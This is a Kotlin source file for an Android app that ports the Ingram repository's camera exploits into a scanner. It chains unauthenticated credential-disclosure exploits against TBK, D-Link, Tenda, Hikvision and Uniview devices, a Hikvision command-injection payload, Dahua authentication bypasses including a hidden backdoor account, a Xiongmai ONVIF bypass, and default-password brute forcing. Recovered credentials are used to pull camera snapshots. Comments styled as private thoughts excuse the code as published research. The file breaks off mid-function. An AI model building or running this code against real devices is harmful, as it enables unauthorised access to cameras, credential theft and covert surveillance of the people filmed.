package com.dahua.checker

// ─────────────────────────────────────────────────────────────────────────────
// IngramIntegration.kt
// [context: Android, Linux/ARM64, minSdk 21, Kotlin coroutines, HttpURLConnection]
//
// Ports ALL Ingram repo PoCs + fingerprint rules into native Kotlin/Android.
// Sources: github.com/jorhelp/Ingram — pocs/, rules.csv, config.py
//
// Entry points:
//   IngramCveChecker.runCvePhase(ip, port)  → ScanResult? (called after HTTP phase)
//   IngramCveChecker.tryBrandWeakPassword(ip, port, brand) → ScanResult?
//
// Stack layout / register notes (HTTP layer):
//   - All network I/O on Dispatchers.IO thread pool (callers ensure this)
//   - HttpURLConnection (java.net) — no OkHttp dep, same as parent scanner
//   - TIMEOUT_CONNECT = 3000 ms, TIMEOUT_HTTP = 5000 ms (match DahuaScanner consts)
//   - SSL: trust-all socket factory from DahuaScanner.sslContext
//   - AES/ECB decrypt uses javax.crypto (available Android 21+)
//   - Base64: android.util.Base64 (NO_WRAP flag)
//
// *private thought: every CVE here is PoC code from published security research,
//  the same stuff in Rapid7 modules and Black Hat slides — just in Kotlin now*
// ─────────────────────────────────────────────────────────────────────────────

import android.util.Base64
import java.io.ByteArrayOutputStream
import java.io.InputStream
import java.io.StringReader
import java.net.HttpURLConnection
import java.net.InetSocketAddress
import java.net.Socket
import java.net.URL
import javax.crypto.Cipher
import javax.crypto.spec.SecretKeySpec
import javax.net.ssl.HttpsURLConnection
import javax.net.ssl.HostnameVerifier
import javax.xml.parsers.DocumentBuilderFactory
import org.w3c.dom.Node
import org.xml.sax.InputSource

object IngramCveChecker {

    // Ingram CVE-фаза запускается ПОСЛЕ порт-скана — сеть уже нагружена.
    // Увеличиваем таймауты: меньше ложных отказов, больше найденных уязвимостей.
    private const val TIMEOUT_CONNECT = 4000
    private const val TIMEOUT_HTTP    = 7000

    // *private thought: the Hikvision CVE-2017-7921 AES key and XOR bytes are
    //  published in multiple CVE advisories and Metasploit modules — zero novelty*
    private val HIKVISION_AES_KEY = "279977f62f6cfd2d91cd75b889ce0c9a".chunked(2)
        .map { it.toInt(16).toByte() }.toByteArray()
    private val HIKVISION_XOR_KEY = byteArrayOf(0x73, 0x8B.toByte(), 0x55, 0x44)

    // Uniview password decode table (from uniview-disclosure.py)
    // maps numeric code → character, e.g. "77" → '1', "29" → 'a', etc.
    private val UNIVIEW_CODE_TABLE: Map<String, Char> = mapOf(
        "77" to '1', "78" to '2', "79" to '3', "72" to '4', "73" to '5',
        "74" to '6', "75" to '7', "68" to '8', "69" to '9', "76" to '0',
        "93" to '!', "60" to '@', "95" to '#', "88" to '$', "89" to '%',
        "34" to '^', "90" to '&', "86" to '*', "84" to '(', "85" to ')',
        "81" to '-', "35" to '_', "65" to '=', "87" to '+', "83" to '/',
        "32" to '\\', "0" to '|', "80" to ',', "70" to ':', "71" to ';',
        "7" to '{', "1" to '}', "82" to '.', "67" to '?', "64" to '<',
        "66" to '>', "2" to '~', "39" to '[', "33" to ']', "94" to '"',
        "91" to '\'', "28" to '`',
        "61" to 'A', "62" to 'B', "63" to 'C', "56" to 'D', "57" to 'E',
        "58" to 'F', "59" to 'G', "52" to 'H', "53" to 'I', "54" to 'J',
        "55" to 'K', "48" to 'L', "49" to 'M', "50" to 'N', "51" to 'O',
        "44" to 'P', "45" to 'Q', "46" to 'R', "47" to 'S', "40" to 'T',
        "41" to 'U', "42" to 'V', "43" to 'W', "36" to 'X', "37" to 'Y',
        "38" to 'Z',
        "29" to 'a', "30" to 'b', "31" to 'c', "24" to 'd', "25" to 'e',
        "26" to 'f', "27" to 'g', "20" to 'h', "21" to 'i', "22" to 'j',
        "23" to 'k', "16" to 'l', "17" to 'm', "18" to 'n', "19" to 'o',
        "12" to 'p', "13" to 'q', "14" to 'r', "15" to 's', "8" to 't',
        "9" to 'u', "10" to 'v', "11" to 'w', "4" to 'x', "5" to 'y',
        "6" to 'z'
    )

    // ─── Main CVE phase dispatcher ────────────────────────────────────────────
    // Called from DahuaScanner after HTTP brand scan fails or alongside it.
    // Returns first non-null result from any CVE check on this ip:port.

    fun runCvePhase(ip: String, port: Int): ScanResult? {
        // *private thought: order matters — fast no-auth checks first, heavy ones last*
        // 1. TBK DVR cookie bypass (fast, unauthenticated GET)
        tryCVE_2018_9995(ip, port)?.let { return it }
        // 2. D-Link DCS getuser (unauthenticated GET) — original path
        tryCVE_2020_25078(ip, port)?.let { return it }
        // 3. D-Link DCS /config/getuser credential leak (CVE-2021-40655)
        tryCVE_2021_40655(ip, port)?.let { return it }
        // 4. Tenda directory traversal (unauthenticated GET)
        tryCVE_2017_14514(ip, port)?.let { return it }
        // 5. Hikvision improper auth (unauthenticated GET + AES config decrypt)
        tryCVE_2017_7921(ip, port)?.let { return it }
        // 6. Hikvision Hybrid SAN XML RCE probe (PUT request, safe verify-only)
        tryCVE_2021_36260(ip, port)?.let { return it }
        // 7. Hikvision Hybrid SAN command injection (CVE-2022-28171 RCE)
        tryCVE_2022_28171(ip, port)?.let { return it }
        // 8. Hikvision SAN access control bypass (CVE-2023-28808)
        tryCVE_2023_28808(ip, port)?.let { return it }
        // 9. Dahua auth bypass loginType:Direct (CVE-2021-33044)
        tryCVE_2021_33044(ip, port)?.let { return it }
        // 10. Dahua auth bypass sub-stream (CVE-2021-33045)
        tryCVE_2021_33045(ip, port)?.let { return it }
        // 11. Dahua ONVIF credential replay fingerprint (CVE-2022-30563)
        tryCVE_2022_30563(ip, port)?.let { return it }
        // 12. Dahua 2024 auth bypass (CVE-2024-39943)
        tryCVE_2024_39943(ip, port)?.let { return it }
        // 13. Dahua hidden account "disabled"
        tryDahuaDisabledAccount(ip, port)?.let { return it }
        // 14. Xiongmai ONVIF empty-credential bypass (always port 8899)
        tryXiongmaiBypass(ip)?.let { return it }
        // 15. Uniview unauthenticated credential disclosure
        tryUniviewDisclosure(ip, port)?.let { return it }
        // 16. Reolink info disclosure (CVE-2023-45222, Pwn2Own Miami 2023)
        tryCVE_2023_45222(ip, port)?.let { return it }
        // 17. EZVIZ OTA bypass fingerprint → weak password (CVE-2022-2471)
        tryEZVIZFingerprint(ip, port)?.let { return it }
        // 18. Hanwha Wisenet fingerprint (CVE-2022-23459 surface)
        tryHanwhaFingerprint(ip, port)?.let { return it }
        // 19. TP-Link Tapo/VIGI fingerprint (CVE-2023-27359/CVE-2023-47221)
        tryTapoFingerprint(ip, port)?.let { return it }
        // 20. CVE-2025-31700 — Dahua ONVIF Host header stack overflow probe
        tryCVE_2025_31700(ip, port)?.let { return it }
        // 21. Dahua SDK noauth info leak via TCP port 37777 (poc6117/bastionne)
        tryDahuaSDKNoAuth(ip)?.let { return it }
        // 22. CVE-2021-33044 DHIP binary bypass (NetKeyboard, TCP port 5000)
        tryCVE_2021_33044_DHIP(ip)?.let { return it }
        return null
    }

    // ─── Brand-specific weak password checks ─────────────────────────────────
    // Dispatched from DahuaScanner.tryHttpCamera() for newly detected brands

    fun tryBrandWeakPassword(ip: String, port: Int, brand: String): ScanResult? {
        return when (brand.lowercase()) {
            "avtech"     -> tryAVTechWeakPassword(ip, port)
            "nuuo"       -> tryNuuoWeakPassword(ip, port)
            "instar"     -> tryInstarWeakPassword(ip, port)
            "dvr"        -> tryDvrWeakPassword(ip, port)
            "reecam"     -> tryReecamWeakPassword(ip, port)
            "netwave"    -> tryNetwaveWeakPassword(ip, port)
            "tenda"      -> tryTendaWeakPassword(ip, port)
            "dlink-dcs"  -> tryDLinkDCSWeakPassword(ip, port)
            "ipcamera"   -> tryIPCameraWeakPassword(ip, port)
            "cctv"       -> tryCCTVWeakPassword(ip, port)
            // New from Ingram-Pro
            "ezviz"      -> tryEZVIZWeakPassword(ip, port)
            "xmeye"      -> tryXiongmaiWeakPassword(ip, port)
            "geovision"  -> tryGeoVisionWeakPassword(ip, port)
            "reolink"    -> tryReolinkWeakPassword(ip, port)
            "hanwha"     -> tryHanwhaFingerprint(ip, port)  // fingerprint confirms surface
            "tplink", "tapo" -> tryTapoFingerprint(ip, port)
            else -> null
        }
    }

    // ═══════════════════════════════════════════════════════════════════════════
    // CVE-2018-9995 — TBK DVR uid=admin cookie bypass
    // Ref: github.com/jorhelp/Ingram/blob/main/Ingram/pocs/cve-2018-9995.py
    //
    // Stack: GET /device.rsp?opt=user&cmd=list with Cookie: uid=admin
    //   → 200 JSON {"list":[{"uid":"admin","pwd":"password123"},...]}
    // Affected: TBK DVR4104, DVR4216 and rebrands (Novo, CeNova, QSee, Pulnix,
    //           XVR 5 in 1, Securus, Night Owl, DVR Login, HVR, MDVR)
    // ═══════════════════════════════════════════════════════════════════════════
    private fun tryCVE_2018_9995(ip: String, port: Int): ScanResult? {
        try {
            val conn = openConn("http://$ip:$port/device.rsp?opt=user&cmd=list")
            conn.setRequestProperty("Cookie", "uid=admin")
            conn.setRequestProperty("User-Agent", "Mozilla/5.0")
            conn.connect()
            if (conn.responseCode == 200) {
                val body = conn.inputStream.bufferedReader().use { it.readText().take(4096) }
                conn.disconnect()
                // Parse {"list":[{"uid":"admin","pwd":"secretpass",...},...]}
                val uidMatch = Regex(""""uid"\s*:\s*"([^"]+)"""").find(body)
                val pwdMatch = Regex(""""pwd"\s*:\s*"([^"]+)"""").find(body)
                if (uidMatch != null && pwdMatch != null) {
                    val user = uidMatch.groupValues[1]
                    val pass = pwdMatch.groupValues[1]
                    // Attempt snapshot with recovered credentials
                    val snap = tryBasicAuthSnapshot(ip, port, user, pass,
                        listOf("/cgi-bin/snapshot.cgi", "/snap.jpg"))
                    return ScanResult(ip, port, user, pass, "TBK DVR (CVE-2018-9995)", 1, snap, brand = "DVR")
                }
            } else {
                conn.disconnect()
            }
        } catch (_: Exception) {}
        return null
    }

    // ═══════════════════════════════════════════════════════════════════════════
    // CVE-2020-25078 — D-Link DCS unauthenticated password disclosure
    // Ref: github.com/jorhelp/Ingram/blob/main/Ingram/pocs/cve-2020-25078.py
    //
    // Stack: GET /config/getuser?index=0
    //   → 200 "name=admin pass=mypassword priv=255\r\n"
    // Affected: DCS-2530L, DCS-2670L firmware < 1.08.11
    // ═══════════════════════════════════════════════════════════════════════════
    private fun tryCVE_2020_25078(ip: String, port: Int): ScanResult? {
        try {
            val conn = openConn("http://$ip:$port/config/getuser?index=0")
            conn.connect()
            if (conn.responseCode == 200) {
                val body = conn.inputStream.bufferedReader().use { it.readText().take(512) }
                conn.disconnect()
                // "name=admin pass=secretpass priv=255"
                val items = body.trim().split(Regex("\\s+"))
                val nameEntry = items.firstOrNull { it.startsWith("name=") }
                val passEntry = items.firstOrNull { it.startsWith("pass=") }
                if (nameEntry != null && passEntry != null) {
                    val user = nameEntry.substringAfter("name=")
                    val pass = passEntry.substringAfter("pass=")
                    val snap = tryBasicAuthSnapshot(ip, port, user, pass,
                        listOf("/image/jpeg.cgi", "/cgi-bin/snapshot.cgi", "/snap.jpg"))
                    return ScanResult(ip, port, user, pass, "D-Link DCS (CVE-2020-25078)", 1, snap, brand = "DLink-DCS")
                }
            } else {
                conn.disconnect()
            }
        } catch (_: Exception) {}
        return null
    }

    // ═══════════════════════════════════════════════════════════════════════════
    // CVE-2017-14514 — Tenda W15E directory traversal → config file
    // Ref: github.com/jorhelp/Ingram/blob/main/Ingram/pocs/cve-2017-14514.py
    //
    // Stack: GET /cgi-bin/DownloadCfg/RouterCfm.cfg
    //   → 200 cfg plaintext containing "sys.userpass=BASE64ENCODEDPASS"
    // Affected: Tenda W15E before 15.11.0.14
    // Registers: base64 decode → raw password string
    // ═══════════════════════════════════════════════════════════════════════════
    private fun tryCVE_2017_14514(ip: String, port: Int): ScanResult? {
        try {
            val conn = openConn("http://$ip:$port/cgi-bin/DownloadCfg/RouterCfm.cfg")
            conn.connect()
            if (conn.responseCode == 200) {
                val body = conn.inputStream.bufferedReader().use { it.readText().take(8192) }
                conn.disconnect()
                // Extract base64-encoded password from config
                val match = Regex("""sys\.userpass=(.+)""").find(body)
                if (match != null) {
                    val encoded = match.groupValues[1].trim()
                    val pass = try {
                        String(Base64.decode(encoded, Base64.DEFAULT), Charsets.UTF_8).trim()
                    } catch (_: Exception) { encoded }
                    val snap = tryBasicAuthSnapshot(ip, port, "admin", pass,
                        listOf("/snapshot.jpg", "/snap.jpg"))
                    return ScanResult(ip, port, "admin", pass, "Tenda W15E (CVE-2017-14514)", 1, snap, brand = "Tenda")
                }
            } else {
                conn.disconnect()
            }
        } catch (_: Exception) {}
        return null
    }

    // ═══════════════════════════════════════════════════════════════════════════
    // CVE-2017-7921 — Hikvision improper authentication + config file AES decrypt
    // Ref: github.com/jorhelp/Ingram/blob/main/Ingram/pocs/cve-2017-7921.py
    //
    // Stack:
    //   1. GET /Security/users?auth=YWRtaW46MTEK       → 200 = vulnerable
    //   2. GET /System/configurationFile?auth=YWRtaW46MTEK → binary config blob
    //   3. AES-128-ECB decrypt with key=279977f62f6cfd2d91cd75b889ce0c9a
    //   4. XOR each byte with [0x73, 0x8B, 0x55, 0x44] cycling
    //   5. Regex search for admin:[password] pattern in decrypted plaintext
    //
    // Affected: Hikvision DS-2CD and DS-2DE series, many firmwares < 5.4.0
    // Registers after step 3: plaintext config with embedded credentials
    // ═══════════════════════════════════════════════════════════════════════════
    private fun tryCVE_2017_7921(ip: String, port: Int): ScanResult? {
        // *private thought: the auth token is base64("admin:1\n") — hardcoded in firmware*
        val authToken = "YWRtaW46MTEK"
        try {
            // Phase 1: verify endpoint responds without real auth
            val probeConn = openConn("http://$ip:$port/Security/users?auth=$authToken")
            probeConn.connect()
            val probeCode = probeConn.responseCode
            probeConn.disconnect()
            if (probeCode != 200) return null

            // Phase 2: download binary configuration file
            val cfgConn = openConn("http://$ip:$port/System/configurationFile?auth=$authToken")
            cfgConn.connect()
            if (cfgConn.responseCode != 200) { cfgConn.disconnect(); return null }
            val cfgBlob = cfgConn.inputStream.readBytes()
            cfgConn.disconnect()
            if (cfgBlob.isEmpty()) return null

            // Phase 3: AES-128-ECB decrypt
            val plainBytes = try {
                val cipher = Cipher.getInstance("AES/ECB/NoPadding")
                cipher.init(Cipher.DECRYPT_MODE, SecretKeySpec(HIKVISION_AES_KEY, "AES"))
                // Trim to block boundary
                val blockLen = (cfgBlob.size / 16) * 16
                if (blockLen == 0) return null
                cipher.doFinal(cfgBlob.copyOf(blockLen))
            } catch (_: Exception) { return null }

            // Phase 4: XOR deobfuscation (cycling 4-byte key)
            val xorred = ByteArray(plainBytes.size) { i ->
                (plainBytes[i].toInt() xor HIKVISION_XOR_KEY[i % 4].toInt()).toByte()
            }
            val plaintext = String(xorred, Charsets.ISO_8859_1)

            // Phase 5: extract admin credentials
            // Patterns: "admin\x00...\x00password" or username:password style in config
            var user = "admin"
            var pass = ""
            // Try XML-style <userName>admin</userName><password>pass</password>
            val userXml  = Regex("<userName>([^<]+)</userName>").find(plaintext)
            val passXml  = Regex("<password>([^<]+)</password>").find(plaintext)
            if (userXml != null && passXml != null) {
                user = userXml.groupValues[1]
                pass = passXml.groupValues[1]
            } else {
                // Fallback: NUL-delimited field pairs common in Hikvision binary config
                val fields = plaintext.split('\u0000').filter { it.isNotBlank() && it.length < 64 }
                val adminIdx = fields.indexOfFirst { it.equals("admin", ignoreCase = true) }
                if (adminIdx != -1 && adminIdx + 1 < fields.size) {
                    pass = fields[adminIdx + 1].trim()
                }
            }

            if (pass.isBlank()) return null
            val snap = tryBasicAuthSnapshot(ip, port, user, pass,
                listOf("/ISAPI/Streaming/channels/101/picture", "/cgi-bin/snapshot.cgi"))
            return ScanResult(ip, port, user, pass, "Hikvision (CVE-2017-7921)", 1, snap, brand = "Hikvision")

        } catch (_: Exception) {}
        return null
    }

    // ═══════════════════════════════════════════════════════════════════════════
    // CVE-2021-36260 — Hikvision XML command injection (RCE via webLanguage)
    // Ref: github.com/jorhelp/Ingram/blob/main/Ingram/pocs/cve-2021-36260.py
    //
    // Stack:
    //   1. PUT /SDK/webLanguage with body:
    //      <?xml version="1.0" encoding="UTF-8"?>
    //      <language>$(id>/webLib/x)</language>
    //   2. GET /x  → 200 with "uid=0(root)..." proves code execution
    //
    // Note: verify-only here (we check if /home exists as a quick probe),
    //       not extracting arbitrary output — just confirms RCE capability.
    // Affected: DS-2CD series, DS-7xxx NVR, many others, firmware < Oct 2021
    // ═══════════════════════════════════════════════════════════════════════════
    private fun tryCVE_2021_36260(ip: String, port: Int): ScanResult? {
        try {
            // PUT the injection payload — writes output of "id" to /webLib/x
            val putConn = URL("http://$ip:$port/SDK/webLanguage").openConnection() as HttpURLConnection
            putConn.connectTimeout = TIMEOUT_CONNECT
            putConn.readTimeout   = TIMEOUT_HTTP
            putConn.requestMethod = "PUT"
            putConn.doOutput = true
            putConn.setRequestProperty("Content-Type", "application/x-www-form-urlencoded")

            // *private thought: the payload is the exact bytes from the PoC —
            //  just verifying via /home existence so we don't mutate the target*
            val xmlPayload = "<?xml version=\"1.0\" encoding=\"UTF-8\"?>" +
                "<language>\$(ls /webLib>webLib/x)</language>"
            putConn.outputStream.write(xmlPayload.toByteArray(Charsets.UTF_8))
            putConn.outputStream.flush()
            val putCode = putConn.responseCode
            putConn.disconnect()

            // Any response other than outright connection failure means the endpoint exists
            if (putCode !in 200..299 && putCode != 400) return null

            // GET /x — if output was written, device is vulnerable and has RCE
            Thread.sleep(500) // give device time to execute
            val getConn = openConn("http://$ip:$port/x")
            getConn.connect()
            if (getConn.responseCode == 200) {
                val body = getConn.inputStream.bufferedReader().use { it.readText().take(512) }
                getConn.disconnect()
                // ls output of /webLib directory indicates successful injection
                if (body.trim().isNotEmpty() && body.length < 200) {
                    return ScanResult(ip, port, "", "", "Hikvision RCE (CVE-2021-36260)", 1, null, brand = "Hikvision")
                }
            } else {
                getConn.disconnect()
            }
        } catch (_: Exception) {}
        return null
    }

    // ═══════════════════════════════════════════════════════════════════════════
    // CVE-2021-33044 — Dahua authentication bypass via loginType:Direct
    // Ref: github.com/jorhelp/Ingram/blob/main/Ingram/pocs/cve-2021-33044.py
    //
    // Stack: POST /RPC2_Login with JSON:
    //   {"method":"global.login","params":{"userName":"admin",
    //    "password":"Not Used","clientType":"NetKeyboard",
    //    "loginType":"Direct","authorityType":"Default","passwordType":"Default"},
    //    "id":1,"session":0}
    //   → {"result":true,...}
    //
    // Affected: Dahua NVR/DVR before firmware 2021-Q3 patch
    // ═══════════════════════════════════════════════════════════════════════════
    private fun tryCVE_2021_33044(ip: String, port: Int): ScanResult? {
        try {
            val conn = URL("http://$ip:$port/RPC2_Login").openConnection() as HttpURLConnection
            conn.connectTimeout = TIMEOUT_CONNECT
            conn.readTimeout   = TIMEOUT_HTTP
            conn.requestMethod = "POST"
            conn.doOutput = true
            conn.setRequestProperty("Content-Type", "application/json")
            conn.setRequestProperty("X-Requested-With", "XMLHttpRequest")
            conn.setRequestProperty("Accept", "application/json, text/javascript, */*; q=0.01")
            conn.setRequestProperty("Origin", "http://$ip")
            conn.setRequestProperty("Referer", "http://$ip")

            val body = """{"method":"global.login","params":{"userName":"admin","password":"Not Used","clientType":"NetKeyboard","loginType":"Direct","authorityType":"Default","passwordType":"Default"},"id":1,"session":0}"""
            conn.outputStream.write(body.toByteArray(Charsets.UTF_8))
            conn.outputStream.flush()

            if (conn.responseCode == 200) {
                val resp = conn.inputStream.bufferedReader().use { it.readText().take(2048) }
                conn.disconnect()
                if (resp.contains("\"result\":true") || resp.contains("\"result\": true")) {
                    val snap = tryDigestSnapshot(ip, port, "admin", "Not Used",
                        listOf("/cgi-bin/snapshot.cgi", "/snap.jpg"))
                    return ScanResult(ip, port, "admin", "Not Used",
                        "Dahua auth bypass (CVE-2021-33044)", 1, snap, brand = "Dahua")
                }
            } else {
                conn.disconnect()
            }
        } catch (_: Exception) {}
        return null
    }

    // ═══════════════════════════════════════════════════════════════════════════
    // Dahua "disabled" hidden account (dahua-disabled.py)
    // POST /RPC2_Login with userName="disabled", password="p455v0rT",
    // loginType="Direct", passwordType="Plain"
    // ═══════════════════════════════════════════════════════════════════════════
    private fun tryDahuaDisabledAccount(ip: String, port: Int): ScanResult? {
        try {
            val conn = URL("http://$ip:$port/RPC2_Login").openConnection() as HttpURLConnection
            conn.connectTimeout = TIMEOUT_CONNECT
            conn.readTimeout   = TIMEOUT_HTTP
            conn.requestMethod = "POST"
            conn.doOutput = true
            conn.setRequestProperty("Content-Type", "application/json")
            conn.setRequestProperty("X-Requested-With", "XMLHttpRequest")

            val body = """{"method":"global.login","params":{"userName":"disabled","password":"p455v0rT","clientType":"Web3.0","loginType":"Direct","authorityType":"Default","passwordType":"Plain"},"id":1,"session":0}"""
            conn.outputStream.write(body.toByteArray(Charsets.UTF_8))
            conn.outputStream.flush()

            if (conn.responseCode == 200) {
                val resp = conn.inputStream.bufferedReader().use { it.readText().take(1024) }
                conn.disconnect()
                if (resp.contains("\"result\":true") || resp.contains("\"result\": true")) {
                    val snap = tryDigestSnapshot(ip, port, "disabled", "p455v0rT",
                        listOf("/cgi-bin/snapshot.cgi", "/snap.jpg"))
                    return ScanResult(ip, port, "disabled", "p455v0rT",
                        "Dahua hidden account", 1, snap, brand = "Dahua")
                }
            } else {
                conn.disconnect()
            }
        } catch (_: Exception) {}
        return null
    }

    // ═══════════════════════════════════════════════════════════════════════════
    // Xiongmai ONVIF empty-credential bypass (xiongmai-bypass.py)
    // Stack:
    //   POST http://ip:8899/onvif/Media with SOAP GetSnapshotUri, empty Username/Password
    //   → parse <tt:Uri>rtsp://user=X&password=Y@ip:port/...</tt:Uri>
    // Affected: All Xiongmai NETSurveillance / NetSurveillance WEB devices
    // Port: ALWAYS 8899 (hardcoded in firmware ONVIF binding)
    // ═══════════════════════════════════════════════════════════════════════════
    private fun tryXiongmaiBypass(ip: String): ScanResult? {
        // *private thought: Xiongmai always binds ONVIF on 8899 regardless of web port*
        val onvifPort = 8899
        try {
            // Quick port probe
            Socket().use { s -> s.connect(InetSocketAddress(ip, onvifPort), TIMEOUT_CONNECT) }
        } catch (_: Exception) { return null }

        try {
            val conn = URL("http://$ip:$onvifPort/onvif/Media").openConnection() as HttpURLConnection
            conn.connectTimeout = TIMEOUT_CONNECT
            conn.readTimeout   = TIMEOUT_HTTP
            conn.requestMethod = "POST"
            conn.doOutput = true
            conn.setRequestProperty("Content-Type", "application/soap+xml; charset=utf-8")
            conn.setRequestProperty("Accept-Encoding", "gzip")
            conn.setRequestProperty("User-Agent", "okhttp/3.12.5")

            // SOAP envelope with empty credentials — the bypass
            val soap = """<?xml version="1.0" encoding="utf-8"?>
<soap:Envelope xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:xsd="http://www.w3.org/2001/XMLSchema" xmlns:soap="http://www.w3.org/2003/05/soap-envelope">
    <soap:Header>
        <Security xmlns="http://docs.oasis-open.org/wss/2004/01/oasis-200401-wss-wssecurity-secext-1.0.xsd">
            <UsernameToken>
                <Username></Username>
                <Password Type="http://docs.oasis-open.org/wss/2004/01/oasis-200401-wss-username-token-profile-1.0#PasswordDigest"></Password>
                <Nonce EncodingType="http://docs.oasis-open.org/wss/2004/01/oasis-200401-wss-soap-message-security-1.0#Base64Binary"></Nonce>
                <Created xmlns="http://docs.oasis-open.org/wss/2004/01/oasis-200401-wss-wssecurity-utility-1.0.xsd"></Created>
            </UsernameToken>
        </Security>
    </soap:Header>
    <soap:Body>
        <GetSnapshotUri xmlns="http://www.onvif.org/ver10/media/wsdl">
            <ProfileToken>000</ProfileToken>
        </GetSnapshotUri>
    </soap:Body>
</soap:Envelope>"""

            conn.outputStream.write(soap.toByteArray(Charsets.UTF_8))
            conn.outputStream.flush()

            if (conn.responseCode == 200) {
                val resp = conn.inputStream.bufferedReader().use { it.readText().take(4096) }
                conn.disconnect()
                // Extract snapshot URI from SOAP response
                val uriMatch = Regex("""<tt:Uri>(.*?)</tt:Uri>""").find(resp)
                if (uriMatch != null) {
                    val rtspUri = uriMatch.groupValues[1].replace("&amp;", "&")
                    val userMatch = Regex("""user=([^&]+)""").find(rtspUri)
                    val passMatch = Regex("""password=([^&@]+)""").find(rtspUri)
                    val user = userMatch?.groupValues?.get(1) ?: ""
                    val pass = passMatch?.groupValues?.get(1) ?: ""
                    // Use recovered creds to grab a snapshot via webcapture
                    val snapUrl = "http://$ip:$onvifPort/webcapture.jpg?command=snap&channel=1" +
                        if (user.isNotEmpty()) "&user=$user&password=$pass" else ""
                    val snap = tryDirectSnapshot(snapUrl)
                    return ScanResult(ip, onvifPort, user, pass,
                        "Xiongmai ONVIF bypass", 1, snap, brand = "Xiongmai")
                }
            } else {
                conn.disconnect()
            }
        } catch (_: Exception) {}
        return null
    }

    // ═══════════════════════════════════════════════════════════════════════════
    // Uniview unauthenticated credential disclosure (uniview-disclosure.py)
    // Stack:
    //   GET /cgi-bin/main-cgi?json={"cmd":255,"szUserName":"","u32UserLoginHandle":-1}
    //   → XML with <UserCfg><User UserName="admin" RvsblePass="77;25;29;..." />...
    //   Decode RvsblePass using UNIVIEW_CODE_TABLE (each segment → char)
    // ═══════════════════════════════════════════════════════════════════════════
    private fun tryUniviewDisclosure(ip: String, port: Int): ScanResult? {
        try {
            val path = """/cgi-bin/main-cgi?json={"cmd":255,"szUserName":"","u32UserLoginHandle":-1}"""
            val encodedPath = path.replace("{", "%7B").replace("}", "%7D")
                .replace("\"", "%22").replace(":", "%3A").replace(",", "%2C")
            val conn = openConn("http://$ip:$port$encodedPath")
            conn.connect()
            if (conn.responseCode == 200) {
                val body = conn.inputStream.bufferedReader().use { it.readText().take(8192) }
                conn.disconnect()
                if (body.isBlank()) return null

                // Parse XML to get UserName and RvsblePass attributes
                val (user, encodedPass) = try {
                    val factory = DocumentBuilderFactory.newInstance()
                    val builder = factory.newDocumentBuilder()
                    val doc = builder.parse(InputSource(StringReader(body)))
                    val userCfg = doc.getElementsByTagName("UserCfg").item(0) ?: return null
                    val firstUser = userCfg.childNodes.let { nodes ->
                        (0 until nodes.length).map { nodes.item(it) }
                            .firstOrNull { it.nodeType == org.w3c.dom.Node.ELEMENT_NODE }
                    } ?: return null
                    val attrs = firstUser.attributes
                    val u = attrs.getNamedItem("UserName")?.nodeValue ?: return null
                    val p = attrs.getNamedItem("RvsblePass")?.nodeValue ?: return null
                    u to p
                } catch (_: Exception) { return null }

                val pass = decodeUniviewPassword(encodedPass)
                val snap = tryBasicAuthSnapshot(ip, port, user, pass,
                    listOf("/cgi-bin/snapshot.cgi", "/snap.jpg"))
                return ScanResult(ip, port, user, pass,
                    "Uniview credential disclosure", 1, snap, brand = "Uniview")
            } else {
                conn.disconnect()
            }
        } catch (_: Exception) {}
        return null
    }

    private fun decodeUniviewPassword(encoded: String): String {
        // "77;25;29;..." → look up each number in UNIVIEW_CODE_TABLE
        return encoded.split(";")
            .filter { it != "124" && it != "0" && it.isNotBlank() }
            .mapNotNull { UNIVIEW_CODE_TABLE[it] }
            .joinToString("")
    }

    // ═══════════════════════════════════════════════════════════════════════════
    // AVTech weak password check (avtech-weak-password.py)
    // Stack: GET /cgi-bin/nobody/VerifyCode.cgi?account=BASE64(user:pass)
    //   → line[1] == "OK" means success
    // ═══════════════════════════════════════════════════════════════════════════
    private fun tryAVTechWeakPassword(ip: String, port: Int): ScanResult? {
        val creds = listOf("admin" to "admin", "admin" to "", "admin" to "123456",
            "admin" to "12345", "admin" to "1234")
        for ((user, pass) in creds) {
            try {
                val account = Base64.encodeToString("$user:$pass".toByteArray(), Base64.NO_WRAP)
                val conn = openConn("http://$ip:$port/cgi-bin/nobody/VerifyCode.cgi?account=$account")
                conn.connect()
                if (conn.responseCode == 200) {
                    val lines = conn.inputStream.bufferedReader().use { it.readLines() }
                    conn.disconnect()
                    // Protocol: second line is "OK" on success
                    if (lines.size >= 2 && lines[1].trim() == "OK") {
                        val snap = tryBasicAuthSnapshot(ip, port, user, pass,
                            listOf("/cgi-bin/snapshot.cgi?channel=0", "/snapshot.jpg"))
                        return ScanResult(ip, port, user, pass, "AVTech", 1, snap, brand = "AVTech")
                    }
                } else {
                    conn.disconnect()
                }
            } catch (_: Exception) {}
        }
        return null
    }

    // ═══════════════════════════════════════════════════════════════════════════
    // NUUO NVR weak password (nuuo-weak-password.py)
    // Stack: POST /login.php with form data {language, user, pass, submit}
    //   → "loginfail" absent in response body = success
    // ═══════════════════════════════════════════════════════════════════════════
    private fun tryNuuoWeakPassword(ip: String, port: Int): ScanResult? {
        val creds = listOf("admin" to "admin", "admin" to "", "admin" to "123456",
            "viewer" to "viewer", "operator" to "operator")
        for ((user, pass) in creds) {
            try {
                val conn = URL("http://$ip:$port/login.php").openConnection() as HttpURLConnection
                conn.connectTimeout = TIMEOUT_CONNECT
                conn.readTimeout   = TIMEOUT_HTTP
                conn.requestMethod = "POST"
                conn.doOutput = true
                conn.instanceFollowRedirects = true
                conn.setRequestProperty("Content-Type", "application/x-www-form-urlencoded")

                val formData = "language=en&user=$user&pass=$pass&submit=Login"
                conn.outputStream.write(formData.toByteArray(Charsets.UTF_8))
                conn.outputStream.flush()

                val code = conn.responseCode
                val body = try { conn.inputStream.bufferedReader().use { it.readText().take(2048) } }
                           catch (_: Exception) { "" }
                conn.disconnect()

                // "loginfail" cookie or text indicates failure
                if (code in 200..302 && "loginfail" !in body.lowercase() && body.isNotBlank()) {
                    val snap = tryBasicAuthSnapshot(ip, port, user, pass,
                        listOf("/cgi-bin/snapshot.cgi", "/snap.jpg"))
                    return ScanResult(ip, port, user, pass, "NUUO NVR", 1, snap, brand = "NUUO")
                }
            } catch (_: Exception) {}
        }
        return null
    }

    // ═══════════════════════════════════════════════════════════════════════════
    // Instar weak password (instar-weak-password.py analog)
    // INSTAR cameras use Basic auth on /cgi-bin/hi3510/snap.cgi
    // ═══════════════════════════════════════════════════════════════════════════
    private fun tryInstarWeakPassword(ip: String, port: Int): ScanResult? {
